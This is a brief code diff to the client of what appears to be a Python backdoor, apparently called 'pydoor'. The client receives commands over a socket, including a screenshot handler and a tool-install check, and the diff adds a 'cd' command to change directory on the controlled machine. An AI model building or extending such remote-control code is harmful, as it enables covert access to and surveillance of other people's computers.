@@ -104,6 +104,12 @@ class Client:
                     self.sock.sendall(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
             elif self.args[0] == "screenshot":
                 s = ScreenshotHandler(self.sock)
+
+            elif self.args[0] == "cd":
+                os.chdir(os.path.abspath(self.args[1]))
+                self.sock.send(b"pydoor_null")
+
+
                 
 
             
@@ -118,7 +124,7 @@ class Client:
     def start(self):
 
         self.parse_args()
-        
+
         print("Starting client" )
 
         self.checkbash()
